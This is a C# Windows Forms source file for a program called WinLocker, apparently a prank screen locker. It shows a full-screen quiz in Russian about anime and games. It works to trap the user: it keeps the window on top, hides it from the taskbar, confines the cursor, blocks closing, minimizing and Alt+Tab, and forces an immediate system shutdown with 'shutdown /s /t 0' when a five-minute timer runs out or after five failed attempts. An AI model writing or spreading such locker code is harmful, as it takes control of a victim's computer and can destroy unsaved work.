using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;


namespace WinLocker
{
    public partial class WinLocker : Form
    {   
        Dictionary<string, string> questions = new Dictionary<string, string>()
        {
            { "Какое имя у главного героя аниме \"Драгонболл Зет\"?", "Гоку" },
            { "Абоба?", "да" },
            { "В каком году вышло аниме \"Человек-бензопила\"?", "2022" },
            { "Какой персонаж аниме \"ДжоДжо's Bizarre Adventure\" \nможет остановить время?", "Джотаро" },
            { "Как зовут главного героя игры \"Minecraft\"?", "Стив" },
            { "Какое имя фамилия у главного героя аниме \"Death Note\"?", "Лайт Ягами" },
            { "Как называется киновселенная, в которой есть персонаж \"Зеленая стрела\"", "DC" },
            { "Как называется серия игр о ведьмочке, созданная компанией \"Nolla Games\"?", "Noita" },
            { "Как зовут главного героя аниме \"One Piece\"?", "Монки Д. Луффи" },
            { "Сколько игровых персонажей в Dota 2?", "124" }
        };


        private string correct = "#2BAD72";
        private string error = "#884444";
        private const int GWL_EXSTYLE = -20;
        private const int WS_EX_TOOLWINDOW = 0x80;
        private const int GWL_STYLE = -16;
        private const int WS_MINIMIZEBOX = 0x20000;
        private const int SWP_NOMOVE = 0x0002;
        private const int SWP_NOSIZE = 0x0001;
        private const int SWP_NOZORDER = 0x0004;
        private const int SWP_SHOWWINDOW = 0x0040;
        private Rectangle limitRect = new Rectangle(1080, 1080, 1920, 1920);
        private const int ALT = 0x12;
        private const int TAB = 0x09;
        private readonly Timer timer = new Timer();
        private int count = 5 * 60;
        private int counter = 5;
        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        private static extern bool ClipCursor(ref RECT lpRect);
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }
        public WinLocker()
        {
            InitializeComponent();
            SetWindowLong(this.Handle, GWL_EXSTYLE, GetWindowLong(this.Handle, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);

            timer.Interval = 1000;
            timer.Tick += Timer_Tick;
        }
       
        private void Form1_Load(object sender, EventArgs e)
        {
            timer.Start();
            const int HWND_TOPMOST = -1;
            IntPtr hWnd = this.Handle;
            int style = GetWindowLong(hWnd, GWL_STYLE);
            SetWindowLong(hWnd, GWL_EXSTYLE, style | WS_EX_TOOLWINDOW);
            SetWindowPos(hWnd, new IntPtr(HWND_TOPMOST), 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);

            Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
            Cursor.Clip = rect;
            labelCounter.Text = Convert.ToString(counter);
            Label[] labels = new Label[10] { Question1, Question2, Question3, Question4, Question5, Question6, Question7, Question8, Question9, Question10 };         
            int i = 0;
            foreach (KeyValuePair<string, string> pair in questions)
            {
                string question = pair.Key;
                string answer = pair.Value;
                labels[i].Text = question;
                i++;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Alt))
            {
                e.Cancel = true;
            }
        }
        private void Form1_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
            {
                WindowState = FormWindowState.Normal;
            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
            }
            base.OnFormClosing(e);
        }
        protected override void OnActivated(EventArgs e)
        {
            SetWindowPos(this.Handle, new IntPtr(0), 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_SHOWWINDOW);
            SetForegroundWindow(this.Handle);
            base.OnActivated(e);
        }
        protected override bool ProcessKeyPreview(ref Message m)
        {
            if (m.Msg == 0x100 && (int)m.WParam == (ALT << 8 | TAB))
            {
                return true;
            }
            return base.ProcessKeyPreview(ref m);
        }
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            SetWindowLong(this.Handle, GWL_STYLE, GetWindowLong(this.Handle, GWL_STYLE) & ~WS_MINIMIZEBOX);
        }
        private void Timer_Tick(object sender, EventArgs e)
        {
            count--;
            if (count <= 0)
            {
                timer.Stop();
                Process.Start("shutdown", "/s /t 0");
            }
            else
            {
                Timer.Text = $"{TimeSpan.FromSeconds(count):mm\\:ss}";
            }
        }

        private void buttonUnlockWin_Click(object sender, EventArgs e)
        {
            TextBox[] answers = new TextBox[10] { answer1, answer2, answer3, answer4, answer5, answer6, answer7, answer8, answer9, answer10 };
            int i = 0;
            int ok = 0;
            counter--;

            foreach (KeyValuePair<string, string> pair in questions)
            {
                string answer = pair.Value;
                string userAnswer = answers[i].Text;

                if (userAnswer.ToLower() == answer.ToLower())
                {
                    answers[i].BackColor = ColorTranslator.FromHtml(correct);
                    ok++;
                }
                else
                {
                    answers[i].BackColor = ColorTranslator.FromHtml(error);
                    
                }
                i++;               
            }
            if (ok == 10)
            {
                Application.Exit();
            }
            if (counter == 0)
            {
                Process.Start("shutdown", "/s /t 0");
                Application.Exit();
            }
        }
        private void buttonUnlockWin_MouseClick(object sender, MouseEventArgs e)
        { 
            labelCounter.Text = Convert.ToString(counter);
        }
    }
}
